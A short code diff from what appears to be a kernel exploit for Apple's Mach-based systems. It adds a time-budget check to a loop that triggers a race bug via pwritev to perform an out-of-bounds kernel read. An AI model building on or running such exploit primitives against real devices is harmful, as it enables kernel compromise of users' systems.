@@ -55,6 +55,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
     ssize_t w = 0;
 
     for (uint64_t try_idx = 0; try_idx < (cs2_ctx.highiest_success_idx + 100); try_idx++) {
+        if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // trigger bug to read oob_offset oob
         w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
